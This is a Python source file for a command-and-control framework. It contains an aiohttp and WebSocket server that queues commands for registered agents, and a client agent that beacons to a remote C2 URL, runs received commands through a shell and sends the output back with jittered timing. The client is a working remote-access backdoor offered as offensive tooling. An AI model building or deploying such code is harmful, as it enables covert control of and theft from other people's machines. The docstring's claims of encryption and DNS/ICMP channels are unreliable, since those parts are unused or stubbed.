"""
Advanced C2 Server
รองรับหลาย protocols: HTTP, DNS, ICMP, WebSocket
พร้อม encryption และ anti-detection
"""

import asyncio
import base64
import json
import hashlib
from typing import Dict, List, Optional
from datetime import datetime
import logging

log = logging.getLogger(__name__)


class C2Agent:
    """C2 Agent information"""
    
    def __init__(self, agent_id: str, ip: str, hostname: str):
        self.agent_id = agent_id
        self.ip = ip
        self.hostname = hostname
        self.last_seen = datetime.now()
        self.commands_queue = []
        self.results = []
    
    def update_last_seen(self):
        self.last_seen = datetime.now()
    
    def add_command(self, command: str):
        self.commands_queue.append({
            'id': hashlib.md5(f"{command}{datetime.now()}".encode()).hexdigest()[:8],
            'command': command,
            'timestamp': datetime.now().isoformat()
        })
    
    def get_next_command(self) -> Optional[Dict]:
        if self.commands_queue:
            return self.commands_queue.pop(0)
        return None
    
    def add_result(self, command_id: str, output: str):
        self.results.append({
            'command_id': command_id,
            'output': output,
            'timestamp': datetime.now().isoformat()
        })


class AdvancedC2Server:
    """Advanced C2 Server with multiple protocols"""
    
    def __init__(self, host: str = '0.0.0.0', http_port: int = 8080):
        self.host = host
        self.http_port = http_port
        self.agents: Dict[str, C2Agent] = {}
        self.encryption_key = self._generate_encryption_key()
    
    def _generate_encryption_key(self) -> bytes:
        """Generate encryption key"""
        return hashlib.sha256(b'c2_secret_key_change_me').digest()
    
    def register_agent(self, agent_id: str, ip: str, hostname: str) -> C2Agent:
        """Register new agent"""
        if agent_id not in self.agents:
            self.agents[agent_id] = C2Agent(agent_id, ip, hostname)
            log.info(f"[C2] New agent registered: {agent_id} ({ip})")
        else:
            self.agents[agent_id].update_last_seen()
        
        return self.agents[agent_id]
    
    def send_command(self, agent_id: str, command: str) -> bool:
        """Send command to agent"""
        if agent_id not in self.agents:
            log.error(f"[C2] Agent {agent_id} not found")
            return False
        
        self.agents[agent_id].add_command(command)
        log.info(f"[C2] Command queued for {agent_id}: {command[:50]}...")
        return True
    
    def get_agent_list(self) -> List[Dict]:
        """Get list of all agents"""
        return [
            {
                'agent_id': agent.agent_id,
                'ip': agent.ip,
                'hostname': agent.hostname,
                'last_seen': agent.last_seen.isoformat(),
                'pending_commands': len(agent.commands_queue),
                'results_count': len(agent.results)
            }
            for agent in self.agents.values()
        ]
    
    def get_agent_results(self, agent_id: str) -> List[Dict]:
        """Get results from agent"""
        if agent_id not in self.agents:
            return []
        
        return self.agents[agent_id].results
    
    async def start_http_server(self):
        """Start HTTP C2 server"""
        from aiohttp import web
        
        app = web.Application()
        
        # Beacon endpoint (agent check-in)
        async def beacon(request):
            try:
                data = await request.json()
                
                agent_id = data.get('agent_id')
                ip = request.remote
                hostname = data.get('hostname', 'unknown')
                
                # Register/update agent
                agent = self.register_agent(agent_id, ip, hostname)
                
                # Get next command
                next_cmd = agent.get_next_command()
                
                if next_cmd:
                    return web.json_response({
                        'status': 'command',
                        'command_id': next_cmd['id'],
                        'command': next_cmd['command']
                    })
                else:
                    return web.json_response({
                        'status': 'idle',
                        'message': 'No commands'
                    })
            
            except Exception as e:
                log.error(f"[C2] Beacon error: {e}")
                return web.json_response({'error': str(e)}, status=500)
        
        # Result endpoint (agent sends command results)
        async def result(request):
            try:
                data = await request.json()
                
                agent_id = data.get('agent_id')
                command_id = data.get('command_id')
                output = data.get('output', '')
                
                if agent_id in self.agents:
                    self.agents[agent_id].add_result(command_id, output)
                    self.agents[agent_id].update_last_seen()
                    
                    log.info(f"[C2] Result received from {agent_id}")
                    
                    return web.json_response({'status': 'ok'})
                else:
                    return web.json_response({'error': 'Agent not found'}, status=404)
            
            except Exception as e:
                log.error(f"[C2] Result error: {e}")
                return web.json_response({'error': str(e)}, status=500)
        
        # Admin endpoints
        async def list_agents(request):
            return web.json_response({
                'agents': self.get_agent_list()
            })
        
        async def send_cmd(request):
            try:
                data = await request.json()
                agent_id = data.get('agent_id')
                command = data.get('command')
                
                success = self.send_command(agent_id, command)
                
                if success:
                    return web.json_response({'status': 'ok'})
                else:
                    return web.json_response({'error': 'Failed'}, status=400)
            
            except Exception as e:
                return web.json_response({'error': str(e)}, status=500)
        
        async def get_results(request):
            agent_id = request.match_info.get('agent_id')
            results = self.get_agent_results(agent_id)
            return web.json_response({'results': results})
        
        # Routes
        app.router.add_post('/beacon', beacon)
        app.router.add_post('/result', result)
        app.router.add_get('/agents', list_agents)
        app.router.add_post('/command', send_cmd)
        app.router.add_get('/results/{agent_id}', get_results)
        
        # Start server
        runner = web.AppRunner(app)
        await runner.setup()
        site = web.TCPSite(runner, self.host, self.http_port)
        
        log.info(f"[C2] HTTP server started on {self.host}:{self.http_port}")
        await site.start()
        
        # Keep running
        await asyncio.Event().wait()
    
    async def start_dns_server(self, port: int = 53):
        """Start DNS C2 server"""
        log.info(f"[C2] DNS server would start on port {port}")
        log.warning("[C2] DNS server not implemented yet - requires root privileges")
        # DNS server requires root privileges
        # Implementation would use dnspython or scapy
    
    async def start_icmp_server(self):
        """Start ICMP C2 server"""
        log.info("[C2] ICMP server would start")
        log.warning("[C2] ICMP server not implemented yet - requires raw sockets")
        # ICMP server requires raw sockets
        # Implementation would use scapy
    
    async def start_websocket_server(self, port: int = 8081):
        """Start WebSocket C2 server"""
        try:
            import websockets
            
            async def handler(websocket, path):
                try:
                    # Receive agent info
                    agent_data = await websocket.recv()
                    data = json.loads(agent_data)
                    
                    agent_id = data.get('agent_id')
                    ip = websocket.remote_address[0]
                    hostname = data.get('hostname', 'unknown')
                    
                    # Register agent
                    agent = self.register_agent(agent_id, ip, hostname)
                    
                    # Send acknowledgment
                    await websocket.send(json.dumps({'status': 'registered'}))
                    
                    # Command loop
                    while True:
                        # Wait for beacon
                        beacon_data = await websocket.recv()
                        
                        # Get next command
                        next_cmd = agent.get_next_command()
                        
                        if next_cmd:
                            await websocket.send(json.dumps(next_cmd))
                            
                            # Wait for result
                            result_data = await websocket.recv()
                            result = json.loads(result_data)
                            
                            agent.add_result(
                                result.get('command_id'),
                                result.get('output', '')
                            )
                        else:
                            await websocket.send(json.dumps({'status': 'idle'}))
                        
                        agent.update_last_seen()
                
                except Exception as e:
                    log.error(f"[C2] WebSocket error: {e}")
            
            async with websockets.serve(handler, self.host, port):
                log.info(f"[C2] WebSocket server started on {self.host}:{port}")
                await asyncio.Event().wait()
        
        except ImportError:
            log.error("[C2] websockets module not installed")
    
    async def start_all(self):
        """Start all C2 servers"""
        tasks = [
            self.start_http_server(),
            # self.start_websocket_server(),  # Uncomment if websockets installed
        ]
        
        await asyncio.gather(*tasks)


# C2 Client (for agents)
class C2Client:
    """C2 Client for agents"""
    
    def __init__(self, c2_url: str, agent_id: str = None):
        self.c2_url = c2_url
        self.agent_id = agent_id or self._generate_agent_id()
        self.hostname = self._get_hostname()
    
    def _generate_agent_id(self) -> str:
        """Generate unique agent ID"""
        import socket
        import uuid
        
        mac = uuid.getnode()
        hostname = socket.gethostname()
        
        return hashlib.md5(f"{mac}{hostname}".encode()).hexdigest()[:16]
    
    def _get_hostname(self) -> str:
        """Get hostname"""
        import socket
        return socket.gethostname()
    
    async def beacon(self) -> Optional[Dict]:
        """Send beacon and get command"""
        import httpx
        
        try:
            async with httpx.AsyncClient(timeout=10.0) as client:
                response = await client.post(
                    f"{self.c2_url}/beacon",
                    json={
                        'agent_id': self.agent_id,
                        'hostname': self.hostname
                    }
                )
                
                if response.status_code == 200:
                    return response.json()
        
        except Exception as e:
            log.error(f"[C2 Client] Beacon failed: {e}")
        
        return None
    
    async def send_result(self, command_id: str, output: str) -> bool:
        """Send command result"""
        import httpx
        
        try:
            async with httpx.AsyncClient(timeout=30.0) as client:
                response = await client.post(
                    f"{self.c2_url}/result",
                    json={
                        'agent_id': self.agent_id,
                        'command_id': command_id,
                        'output': output
                    }
                )
                
                return response.status_code == 200
        
        except Exception as e:
            log.error(f"[C2 Client] Send result failed: {e}")
            return False
    
    async def run(self, interval: int = 60):
        """Run C2 client loop"""
        import subprocess
        
        log.info(f"[C2 Client] Starting with ID: {self.agent_id}")
        
        while True:
            try:
                # Send beacon
                response = await self.beacon()
                
                if response and response.get('status') == 'command':
                    command_id = response.get('command_id')
                    command = response.get('command')
                    
                    log.info(f"[C2 Client] Executing: {command[:50]}...")
                    
                    # Execute command
                    try:
                        output = subprocess.check_output(
                            command,
                            shell=True,
                            stderr=subprocess.STDOUT,
                            timeout=300
                        ).decode('utf-8', errors='ignore')
                    except Exception as e:
                        output = f"Error: {str(e)}"
                    
                    # Send result
                    await self.send_result(command_id, output)
                
                # Sleep with jitter
                import random
                sleep_time = interval + random.randint(-10, 10)
                await asyncio.sleep(sleep_time)
            
            except Exception as e:
                log.error(f"[C2 Client] Error: {e}")
                await asyncio.sleep(interval)


# Example usage
if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    
    # Start C2 server
    server = AdvancedC2Server(host='0.0.0.0', http_port=8080)
    
    asyncio.run(server.start_all())

